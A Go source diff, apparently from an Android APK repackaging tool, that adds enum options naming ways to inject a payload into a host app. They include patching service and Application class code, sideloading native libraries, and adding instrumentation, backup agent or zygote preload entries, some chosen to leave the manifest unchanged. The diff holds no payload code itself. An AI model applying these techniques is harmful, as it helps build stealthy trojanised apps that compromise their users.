@@ -22,6 +22,24 @@ const (
 	// Assets_payload ships the real payload encrypted in assets/ and lets a small
 	// in-APK stub decrypt and DexClassLoader it at runtime (see pkg/assetpayload).
 	Assets_payload Payload_option_type = 8
+	// Service_payload patches the code of the services the host declares: the
+	// payload call is inserted into the <init> of every class named in a
+	// <service android:name> element, so the host's own startService/bind path
+	// runs it. Nothing is added to the manifest and no class is renamed.
+	Service_payload Payload_option_type = 9
+	// Native_sideload_payload ships the payload as a library name the host asks
+	// for with System.loadLibrary() but does not ship itself.
+	Native_sideload_payload Payload_option_type = 10
+	// CodePatchApp_payload patches the code of the host Application class
+	// (<clinit>, else <init>): the manifest is left byte-identical.
+	CodePatchApp_payload Payload_option_type = 11
+	// Instrumentation_payload declares an <instrumentation> the host never had.
+	Instrumentation_payload Payload_option_type = 12
+	// BackupAgent_payload declares android:backupAgent on <application>.
+	BackupAgent_payload Payload_option_type = 13
+	// ZygotePreload_payload declares android:zygotePreloadName plus the isolated
+	// service that makes the platform fork the app zygote.
+	ZygotePreload_payload Payload_option_type = 14
 )
 
 var Payload_option int
